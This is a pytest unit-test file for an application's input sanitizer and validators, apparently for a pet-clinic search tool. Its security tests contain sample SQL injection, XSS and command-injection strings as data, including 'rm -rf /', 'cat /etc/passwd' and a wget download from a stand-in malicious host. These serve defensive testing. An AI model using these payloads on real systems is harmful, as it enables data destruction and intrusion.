"""
Unit tests for input validation and sanitization functionality.
"""
import sys
from pathlib import Path
import pytest

# Add the parent directory to sys.path so we can import main
sys.path.insert(0, str(Path(__file__).parent.parent))

import main


class TestInputSanitization:
    """Test input sanitization functionality."""
    
    @pytest.mark.unit
    def test_sanitize_input_basic(self):
        """Test basic input sanitization."""
        input_str = "normal input"
        result = main.sanitize_input(input_str)
        assert result == "normal input"
    
    @pytest.mark.unit
    def test_sanitize_input_removes_dangerous_chars(self):
        """Test that dangerous characters are removed."""
        dangerous_inputs = [
            '<script>alert("xss")</script>',
            'input"with"quotes',
            "input'with'single'quotes",
            'input;with;semicolons',
            'input\\with\\backslashes',
            'input>with>greater>than',
            'input<with<less<than'
        ]
        
        expected_results = [
            'scriptalert(xss)/script',
            'inputwithquotes',
            'inputwithsinglequotes',
            'inputwithsemicolons',
            'inputwithbackslashes',
            'inputwithgreaterthan',
            'inputwithlessthan'
        ]
        
        for dangerous, expected in zip(dangerous_inputs, expected_results):
            result = main.sanitize_input(dangerous)
            assert result == expected
    
    @pytest.mark.unit
    def test_sanitize_input_strips_whitespace(self):
        """Test that whitespace is stripped."""
        inputs_with_whitespace = [
            "  normal input  ",
            "\\n\\ninput with newlines\\n\\n",
            "\\t\\tinput with tabs\\t\\t"
        ]
        
        for input_str in inputs_with_whitespace:
            result = main.sanitize_input(input_str)
            assert result.strip() == result
    
    @pytest.mark.unit
    def test_sanitize_input_length_limit(self, caplog):
        """Test that input is truncated when too long."""
        long_input = "a" * 150
        result = main.sanitize_input(long_input, max_length=100)
        
        assert len(result) == 100
        assert result == "a" * 100
        assert "Input truncated to 100 characters" in caplog.text
    
    @pytest.mark.unit
    def test_sanitize_input_custom_max_length(self):
        """Test sanitization with custom max length."""
        input_str = "a" * 60
        result = main.sanitize_input(input_str, max_length=50)
        
        assert len(result) == 50
        assert result == "a" * 50
    
    @pytest.mark.unit
    def test_sanitize_input_non_string_raises_error(self):
        """Test that non-string input raises ValueError."""
        non_string_inputs = [123, None, [], {}, True]
        
        for non_string in non_string_inputs:
            with pytest.raises(ValueError, match="Input must be a string"):
                main.sanitize_input(non_string)
    
    @pytest.mark.unit
    def test_sanitize_input_empty_string(self):
        """Test sanitization of empty string."""
        result = main.sanitize_input("")
        assert result == ""
    
    @pytest.mark.unit
    def test_sanitize_input_unicode_characters(self):
        """Test sanitization preserves unicode characters."""
        unicode_input = "café résumé naïve 北京"
        result = main.sanitize_input(unicode_input)
        assert result == unicode_input
    
    @pytest.mark.unit
    def test_sanitize_input_mixed_dangerous_and_safe(self):
        """Test sanitization of mixed dangerous and safe characters."""
        mixed_input = 'Safe text with "dangerous" chars and <script> tags'
        expected = 'Safe text with dangerous chars and script tags'
        result = main.sanitize_input(mixed_input)
        assert result == expected


class TestCoordinateValidation:
    """Test coordinate validation functionality."""
    
    @pytest.mark.unit
    @pytest.mark.parametrize("lat,lng,expected", [
        # Valid coordinates
        (0, 0, True),
        (-90, -180, True),
        (90, 180, True),
        (-6.2088, 106.8456, True),  # Jakarta coordinates
        (40.7128, -74.0060, True),  # New York coordinates
        (-33.8688, 151.2093, True),  # Sydney coordinates
        
        # Invalid latitudes
        (-91, 0, False),
        (91, 0, False),
        (-90.1, 0, False),
        (90.1, 0, False),
        
        # Invalid longitudes
        (0, -181, False),
        (0, 181, False),
        (0, -180.1, False),
        (0, 180.1, False),
        
        # Edge cases
        (-90.0, -180.0, True),
        (90.0, 180.0, True),
        (-89.999999, -179.999999, True),
        (89.999999, 179.999999, True),
    ])
    def test_validate_coordinates(self, lat, lng, expected):
        """Test coordinate validation with various values."""
        assert main.validate_coordinates(lat, lng) == expected
    
    @pytest.mark.unit
    def test_validate_coordinates_type_handling(self):
        """Test that coordinate validation handles different numeric types."""
        # Test with integers
        assert main.validate_coordinates(0, 0) is True
        assert main.validate_coordinates(-6, 106) is True
        
        # Test with floats
        assert main.validate_coordinates(0.0, 0.0) is True
        assert main.validate_coordinates(-6.2088, 106.8456) is True


class TestRadiusValidation:
    """Test radius validation functionality."""
    
    @pytest.mark.unit
    @pytest.mark.parametrize("radius,expected", [
        # Valid radii
        (1, True),
        (100, True),
        (1000, True),
        (25000, True),
        (50000, True),  # Maximum allowed
        
        # Invalid radii
        (0, False),
        (-1, False),
        (-100, False),
        (50001, False),  # Over maximum
        (100000, False),
        
        # Edge cases
        (1, True),  # Minimum allowed
        (49999, True),
        (50000, True),  # Exact maximum
    ])
    def test_validate_radius(self, radius, expected):
        """Test radius validation with various values."""
        assert main.validate_radius(radius) == expected
    
    @pytest.mark.unit
    def test_validate_radius_type_handling(self):
        """Test that radius validation handles different numeric types."""
        # Test with integer
        assert main.validate_radius(1000) is True
        
        # Test with float (should still work)
        assert main.validate_radius(1000.0) is True
        assert main.validate_radius(1000.5) is True


class TestSecurityValidation:
    """Test security-related validation functionality."""
    
    @pytest.mark.unit
    def test_sanitize_sql_injection_patterns(self):
        """Test that SQL injection patterns are sanitized."""
        sql_injection_patterns = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            '" OR "1"="1',
            "'; SELECT * FROM users; --",
            "' UNION SELECT * FROM passwords --"
        ]
        
        for pattern in sql_injection_patterns:
            result = main.sanitize_input(pattern)
            # Check that dangerous characters are removed
            assert "'" not in result
            assert '"' not in result
            assert ';' not in result
    
    @pytest.mark.unit
    def test_sanitize_xss_patterns(self):
        """Test that XSS patterns are sanitized."""
        xss_patterns = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(1)"></iframe>'
        ]
        
        for pattern in xss_patterns:
            result = main.sanitize_input(pattern)
            # Check that dangerous characters are removed
            assert '<' not in result
            assert '>' not in result
            assert '"' not in result
    
    @pytest.mark.unit
    def test_sanitize_command_injection_patterns(self):
        """Test that command injection patterns are sanitized."""
        command_injection_patterns = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; wget malicious.com/script.sh",
            "\\ ; echo 'injected'"
        ]
        
        for pattern in command_injection_patterns:
            result = main.sanitize_input(pattern)
            # Check that dangerous characters are removed
            assert ';' not in result
            assert '\\' not in result
    
    @pytest.mark.unit
    def test_sanitize_preserves_legitimate_content(self):
        """Test that legitimate content is preserved during sanitization."""
        legitimate_inputs = [
            "Pet Clinic Jakarta",
            "Veterinary Hospital & Grooming",
            "Animal Care Center 2024",
            "Dr. Smith's Pet Services",
            "24/7 Emergency Vet",
            "Pets & Animals Store",
            "Grooming, Boarding & Training"
        ]
        
        for legitimate in legitimate_inputs:
            result = main.sanitize_input(legitimate)
            # Should preserve most content (except quotes and dangerous chars)
            assert len(result) > 0
            assert any(word in result for word in legitimate.split() if not any(char in word for char in '<>"\'\\;'))
    
    @pytest.mark.unit
    def test_validate_api_key_security(self):
        """Test API key validation from security perspective."""
        # Test that obvious fake/test keys are rejected
        fake_keys = [
            "test_key",
            "fake_api_key",
            "12345",
            "abcdef",
            "your_api_key_here",
            "placeholder",
            "dummy_key"
        ]
        
        for fake_key in fake_keys:
            assert main.validate_api_key(fake_key) is False
    
    @pytest.mark.unit
    def test_length_limits_prevent_dos(self):
        """Test that length limits prevent potential DoS attacks."""
        # Test with extremely long input
        massive_input = "a" * 10000
        result = main.sanitize_input(massive_input, max_length=100)
        
        assert len(result) == 100
        
        # Test with default max length
        result_default = main.sanitize_input(massive_input)
        assert len(result_default) == 100  # Default max length